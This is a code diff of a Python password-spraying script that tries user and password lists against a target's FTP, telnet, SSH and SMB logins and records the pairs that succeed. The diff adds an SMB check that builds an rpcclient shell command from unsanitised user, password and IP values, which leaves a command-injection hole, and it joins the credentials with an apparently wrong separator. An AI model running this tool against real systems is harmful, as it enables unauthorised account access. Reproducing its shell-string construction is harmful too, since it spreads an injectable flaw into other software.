@@ -1,9 +1,4 @@
 #!/usr/bin/python3
-"""
-	sprayette.py protocol ip user pass attemps timer 
-					port optional
-"""
-
 import argparse
 import time
 import telnetlib
@@ -11,13 +6,13 @@ import paramiko
 import os
 from ftplib import FTP
 
-#variables
+#lists
 user_list = list()
 pass_list = list()
 valid_creds = list()
 #Pretty messages
 def pGreen(value): return '\033[92m{}\033[90m'.format(value)
-def pRed(value): return ''.format(value)
+def pRed(value): return '\033[91m{}\033[90m'.format(value)
 def pWarning(value): return '\033[93m{}\033[90m'.format(value)
 #Arguments
 parser = argparse.ArgumentParser()
@@ -42,8 +37,6 @@ with open(args.passwords,'r') as p_file:
 	for p in p_file.readlines():
 		pass_list.append(p.replace('\n',''))
 
-
-
 def ftp_connect(user,password):
 	msg = '[*] Trying with {}:{}'.format(user,password)
 	ftp_p = spec_port if spec_port else 21
@@ -60,6 +53,7 @@ def ftp_connect(user,password):
 		pass
 	print(msg)
 	return
+
 def telnet_connect(user,password):
 	msg = '[*] Trying with {}:{}'.format(user,password)
 	u = (user+'\n').encode('utf-8')
@@ -79,6 +73,7 @@ def telnet_connect(user,password):
 		pass
 	print(msg)
 	return
+
 def ssh_connect(user,password):
 	msg = '[*] Trying with {}:{}'.format(user,password)
 	ssh_p = spec_port if spec_port else 22
@@ -95,14 +90,15 @@ def ssh_connect(user,password):
 		pass
 	print(msg)
 	return
+
 def smb_connect(user,password):
 	msg = '[*] Trying with {}:{}'.format(user,password)
-	try:
+	result = os.popen( 'rpcclient -U "{}.{}" -c "getusername;quit" {}'.format(user,password,ip)).read()
+	if not 'NT_STATUS_LOGON_FAILURE' in result:
+		valid_creds.append(user+':'+password)
 		msg += pGreen('-- Success!!!')
-	except Exception as e:
-		print(str(e))
+	else:
 		msg += pRed('-- Failed!!!')
-		pass
 	print(msg)
 	return
 
